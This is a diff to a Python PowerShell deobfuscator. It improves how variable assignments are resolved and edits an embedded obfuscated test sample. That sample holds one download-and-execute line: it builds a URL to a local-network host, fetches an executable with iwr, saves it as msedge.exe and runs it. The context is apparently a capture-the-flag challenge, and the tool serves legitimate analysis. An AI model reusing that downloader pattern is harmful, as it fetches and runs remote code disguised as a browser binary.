@@ -97,6 +97,8 @@ def concat_code(code):
             parts = check[i].split('+=')
             if "+" in parts[1]:
                 newparts = check_symbols(parts[1])
+            else:
+                newparts = parts[1]
             check[i] = parts[0] + "+=" + newparts
             newcoderes.append(check[i])
     newcode = ''.join([i for i in newcoderes])
@@ -144,22 +146,39 @@ def replace_multiple_variables(code):
         append_match = re.match(append_pattern, line)
         
         if match:
-            var, value = match.groups()[0], match.groups()[1]
-            value_dict[var] = value
+            vars_values = match.group(0).split("=")
+            vars = [v.strip() for v in vars_values[:-1]]
+            value = vars_values[-1].strip()
+            for var in vars:
+                value_dict[var] = value
         elif append_match:
-            var, value = append_match.groups()
+            var, value = append_match.groups()[0], append_match.groups()[1]
             if var in value_dict:
                 value_dict[var] += value
             else:
                 value_dict[var] = value
+
+    for var, value in list(value_dict.items()):
+        if value in value_dict:
+            value_dict[var] = value_dict[value]
     
+    for var, value in list(value_dict.items()):
+        chain = []
+        while value in value_dict and value not in chain:
+            chain.append(value)
+            value = value_dict[value]
+        for v in chain:
+            value_dict[v] = value
+        value_dict[var] = value
+    
+
     reverse_dict = {}
     for var, value in value_dict.items():
         if value in reverse_dict:
             reverse_dict[value].append(var)
         else:
             reverse_dict[value] = [var]
-    
+
     newcode = []
     for value, vars in reverse_dict.items():
         if len(vars) > 1:
@@ -174,6 +193,7 @@ def replace_multiple_variables(code):
     return "\n".join(newcode)
 
 
+
 def deobfuscate(code):
     code = char_intended(code)
     code = char_transform(code)
@@ -185,15 +205,19 @@ def deobfuscate(code):
 
 testing = """
 $tes = [Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13)
+$tes2 += [ChaR](98   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
 $tes2 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
 $tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
 $tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)'
 $tes5 = $tessss = ReplAce('hel'+ ([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo",[ChaR](99+               10)   '+'   [CHar](109 -bxor 4))
 $u='ht'+'tp://192.168.0.16:8282/B64_deC'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
-$tes += '[ChaR](99+               10)   +   [CHar](109 -bxor 4)'
 $tes6 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
 $tes7 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
-$tes2 += [ChaR](98   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
+$tesss = pe
+$tesss += [ChaR](100   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
+$tes8 = $tesss
 """
+
+
 # deobfuscate(testing)
 print(deobfuscate(testing))
